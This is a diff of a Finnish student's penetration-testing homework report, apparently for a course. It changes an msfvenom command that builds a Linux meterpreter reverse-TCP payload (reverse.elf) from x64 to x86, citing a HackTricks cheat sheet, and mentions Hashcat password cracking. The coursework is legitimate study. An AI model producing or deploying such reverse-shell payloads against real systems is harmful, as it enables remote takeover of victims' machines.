@@ -33,7 +33,7 @@ Santos et al 2017: Security Penetration Testing - The Art of Hacking Series Live
 Polop et al 2024: HackTricks: MSFVenom - CheatSheet [https://book.hacktricks.xyz/generic-methodologies-and-resources/reverse-shells/msfvenom](https://book.hacktricks.xyz/generic-methodologies-and-resources/reverse-shells/msfvenom)
 
 - Listaa payloadit: ``msfvenom -l payloads``
-- Reverse shell payload ``msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f elf > reverse.elf``
+- Reverse shell payload ``msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f elf > reverse.elf``
 
 
 ## a) Asenna Hashcat ja testaa sen toiminta murtamalla esimerkkisalasana
@@ -197,7 +197,7 @@ Aloitin tehtävän, mutta koneeni jumittui kesken kaiken ja raportoimani kohdatk
 
 Jatkoa 21.11.2024 9:50.
 
-Aloitin komennolla ``msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f elf > reverse.elf``, joka löytyi [MSFVenom CheatSheetistä](https://book.hacktricks.xyz/generic-methodologies-and-resources/reverse-shells/msfvenom#common-params-when-creating-a-shellcode). Sillä loin haittaohjelman.
+Aloitin komennolla ``msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f elf > reverse.elf``, joka löytyi [MSFVenom CheatSheetistä](https://book.hacktricks.xyz/generic-methodologies-and-resources/reverse-shells/msfvenom#common-params-when-creating-a-shellcode). Sillä loin haittaohjelman.
 
 
 ## Lähteet 
